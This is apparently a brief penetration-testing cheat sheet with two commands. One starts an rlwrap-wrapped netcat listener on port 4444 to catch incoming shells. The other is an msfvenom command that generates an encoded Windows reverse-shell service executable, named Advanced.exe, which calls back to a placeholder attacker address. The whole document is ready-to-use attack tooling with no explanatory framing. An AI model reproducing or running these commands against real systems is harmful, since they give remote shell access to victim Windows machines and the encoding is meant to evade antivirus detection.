## `rlwrap` with Netcat Listner

```bash
rlwrap -f . -r nc -nvlp 4444
```

## Windows

```
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

